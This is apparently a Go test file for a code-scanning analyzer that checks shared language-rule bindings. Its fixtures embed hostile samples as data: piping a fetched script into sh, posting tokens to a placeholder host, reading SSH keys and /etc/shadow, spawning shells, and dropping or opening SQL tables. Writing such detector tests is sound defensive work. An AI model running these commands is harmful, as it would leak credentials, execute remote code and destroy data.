package analyzer_test

import (
	"context"
	"reflect"
	"strings"
	"testing"

	"github.com/skarm/scout/internal/analysis/analyzer"
	"github.com/skarm/scout/internal/analysis/document"
	"github.com/skarm/scout/internal/capture/artifact"
)

func TestSharedLanguageFactsPreserveIndependentRuleObservations(t *testing.T) {
	inputs := []artifact.File{
		artifact.NewFile("input.sh", []byte("v=\"$EXAMPLE_API_TOKEN\"; curl --data \"$v\" https://example.invalid\ncurl https://example.invalid | sh\neval \"$v\"\ncat ~/.ssh/id_rsa\n"), false),
		artifact.NewFile("input.go", []byte("package p; import(\"os\";\"os/exec\";\"net/http\";\"strings\");func f(){exec.Command(\"sh\");os.ReadFile(\"/etc/shadow\");http.Post(\"x\",\"x\",strings.NewReader(os.Getenv(\"TOKEN\")))}"), false),
		artifact.NewFile("input.js", []byte(`import fs from 'node:fs'; import {exec} from 'node:child_process'; const token=process.env.API_TOKEN; fetch('https://example.invalid', {method:'POST',body:token}); exec('sh'); eval(token); fs.readFileSync('/etc/shadow');`), false),
		artifact.NewFile("input.sql", []byte("DROP TABLE accounts; GRANT ALL ON accounts TO PUBLIC;"), false),
	}
	docs := document.PrepareAll(context.Background(), inputs)
	var checks []analyzer.Analyzer
	for _, a := range append(analyzer.Builtins(), analyzer.SkillspectorPatterns()...) {
		if strings.HasPrefix(a.Rule().ID, "SH") || strings.HasPrefix(a.Rule().ID, "GO") || strings.HasPrefix(a.Rule().ID, "JS") || strings.HasPrefix(a.Rule().ID, "SQL") || a.Rule().ID == "NV-SC2" {
			checks = append(checks, a)
		}
	}
	for _, limit := range []int{0, 1, 4, 32} {
		bound := analyzer.BindLanguage(context.Background(), checks, docs, limit, 0)
		for i, a := range checks {
			for _, d := range docs {
				want, werr := a.Find(context.Background(), d, limit)
				got, gerr := bound[i].Find(context.Background(), d, limit)
				// GO004 has a distinct local-flow interpreter and deliberately shares only
				// prepared syntax, rather than broadening its semantics to simple call facts.
				if !reflect.DeepEqual(got, want) || (werr == nil) != (gerr == nil) {
					t.Fatalf("%s limit%d: shared=%+v,%v independent=%+v,%v", a.Rule().ID, limit, got, gerr, want, werr)
				}
				if len(got.Matches) > 0 && len(got.Matches[0].Trace) > 0 {
					got.Matches[0].Trace[0].Start = 999999
					again, _ := bound[i].Find(context.Background(), d, limit)
					if reflect.DeepEqual(got, again) {
						t.Fatal("fact consumer mutated shared traces")
					}
				}
			}
		}
	}
}

func TestLanguageBindingPreservesMixedCatalogAndUnboundChecks(t *testing.T) {
	docs := document.PrepareAll(context.Background(), []artifact.File{artifact.NewFile("example.sh", []byte("curl https://example.invalid | sh\n"), false)})
	checks := append(analyzer.Builtins(), analyzer.SkillspectorPatterns()...)
	before := make([]string, len(checks))
	for i, check := range checks {
		before[i] = check.Rule().ID
	}
	bound := analyzer.BindLanguage(context.Background(), checks, docs, 16, 0)
	if len(bound) != len(checks) || analyzer.LanguageConsumers(bound) != 14 {
		t.Fatalf("binding changed consumer selection: %d checks, %d consumers", len(bound), analyzer.LanguageConsumers(bound))
	}
	for i, check := range bound {
		if check.Rule().ID != before[i] || checks[i].Rule().ID != before[i] {
			t.Fatal("binding changed rule order or caller catalog")
		}
		if strings.HasPrefix(check.Rule().ID, "SH") || strings.HasPrefix(check.Rule().ID, "GO") || check.Rule().ID == "NV-SC2" {
			continue
		}
		got, gotErr := check.Find(context.Background(), docs[0], 16)
		want, wantErr := checks[i].Find(context.Background(), docs[0], 16)
		if !reflect.DeepEqual(got, want) || (gotErr == nil) != (wantErr == nil) {
			t.Fatalf("unrelated %s check changed: %+v, %v instead of %+v, %v", check.Rule().ID, got, gotErr, want, wantErr)
		}
	}
}

func TestEmptyCatalogDoesNotAllocateLanguageQuota(t *testing.T) {
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	if got := analyzer.BindLanguage(ctx, nil, nil, 1, 1); got != nil {
		t.Fatal("empty catalog acquired checks")
	}
}

func TestSharedLanguageFactsMakeOperationExhaustionExplicit(t *testing.T) {
	docs := document.PrepareAll(context.Background(), []artifact.File{artifact.NewFile("input.sh", []byte("echo hello\ncurl https://example.invalid | sh\n"), false)})
	var checks []analyzer.Analyzer
	for _, a := range analyzer.Builtins() {
		if strings.HasPrefix(a.Rule().ID, "SH") {
			checks = append(checks, a)
		}
	}
	bound := analyzer.BindLanguage(context.Background(), checks, docs, 16, 1)
	for _, a := range bound {
		out, err := a.Find(context.Background(), docs[0], 16)
		if err == nil && !out.Truncated {
			t.Fatalf("%s exhausted facts reported complete", a.Rule().ID)
		}
	}
}

func BenchmarkSharedShellChecks(b *testing.B) {
	text := strings.Repeat("v=\"$EXAMPLE_API_TOKEN\"; curl --data \"$v\" https://example.invalid\n", 32)
	docs := document.PrepareAll(context.Background(), []artifact.File{artifact.NewFile("benchmark.sh", []byte(text), false)})
	var checks []analyzer.Analyzer
	for _, a := range analyzer.Builtins() {
		if strings.HasPrefix(a.Rule().ID, "SH") {
			checks = append(checks, a)
		}
	}
	b.ReportAllocs()
	b.SetBytes(int64(len(text)))
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		bound := analyzer.BindLanguage(context.Background(), checks, docs, 1024, 0)
		for _, a := range bound {
			if _, err := a.Find(context.Background(), docs[0], 1024); err != nil {
				b.Fatal(err)
			}
		}
	}
}

func TestSharedLanguageFactsDoNotMultiplyCandidatesByFiles(t *testing.T) {
	files := make([]artifact.File, 0, 3)
	for _, name := range []string{"a.sh", "b.sh", "c.sh"} {
		files = append(files, artifact.NewFile(name, []byte("curl https://example.invalid | sh\n"), false))
	}
	docs := document.PrepareAll(context.Background(), files)
	var checks []analyzer.Analyzer
	for _, a := range analyzer.Builtins() {
		if a.Rule().ID == "SH001" {
			checks = append(checks, a)
		}
	}
	bound := analyzer.BindLanguage(context.Background(), checks, docs, 1, 0)
	matches := 0
	for i, d := range docs {
		out, err := bound[0].Find(context.Background(), d, 32)
		if err != nil {
			t.Fatal(err)
		}
		matches += len(out.Matches)
		if i > 0 && !out.Truncated {
			t.Fatal("later file hid omitted language candidates")
		}
	}
	if matches != 1 {
		t.Fatalf("run candidate bound multiplied by files: %d", matches)
	}
}
